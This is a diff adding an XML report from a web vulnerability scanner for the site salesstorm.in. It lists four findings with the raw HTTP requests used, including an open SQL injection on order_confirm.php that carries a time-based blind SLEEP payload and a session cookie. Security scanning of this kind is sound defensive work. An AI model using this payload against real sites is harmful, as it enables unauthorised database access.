@@ -1,0 +1,29 @@
+<?xml version="1.0"?>
+<scanner_vulnerabilities xmlns:foo="http://www.foo.org/" xmlns:bar="http://www.bar.org"><vulnerability><attack_type>Other Application Attacks</attack_type><name>Server Misconfiguration</name><url>https://salesstorm.in/</url><parameter>GET / HTTP/1.0
+Host: salesstorm.in
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4
+Pragma: no-cache
+Cache-Control: no-cache
+
+</parameter><cookie/><threat>1</threat><score>1.9</score><severity>1</severity><status>open</status><opened>1</opened></vulnerability><vulnerability><attack_type>Predictable Resource Location</attack_type><name>Predictable Resource Location</name><url>https://salesstorm.in/</url><parameter>GET /robots.txt HTTP/1.0
+Host: salesstorm.in
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4
+Pragma: no-cache
+Cache-Control: no-cache
+
+</parameter><cookie/><threat>0</threat><score>0.0</score><severity>0</severity><status>open</status><opened>1</opened></vulnerability><vulnerability><attack_type>Predictable Resource Location</attack_type><name>Predictable Resource Location</name><url>https://salesstorm.in/online/products.php</url><parameter>GET /online/products1.php HTTP/1.0
+Host: salesstorm.in
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4
+Pragma: no-cache
+Cache-Control: no-cache
+
+</parameter><cookie/><threat>0</threat><score>0.0</score><severity>0</severity><status>open</status><opened>1</opened></vulnerability><vulnerability><attack_type>SQL-Injection</attack_type><name>SQL Injection</name><url>https://salesstorm.in/online/order_confirm.php</url><parameter>POST /online/order_confirm.php HTTP/1.0
+Host: salesstorm.in
+Cookie: PHPSESSID=89esgk3ikqov1gcj2ggo2jcr87;
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.4 (KHTML, like Gecko) Chrome/22.0.1229.94 Safari/537.4
+Pragma: no-cache
+Cache-Control: no-cache
+Content-Length: 68
+Content-Type: application/x-www-form-urlencoded
+
+des=a' AND (SELECT * FROM (SELECT(SLEEP(10)))OAxT) AND 'VepZ'='VepZ&amp;</parameter><cookie/><threat>3</threat><score>7.5</score><severity>3</severity><status>open</status><opened>1</opened></vulnerability></scanner_vulnerabilities>
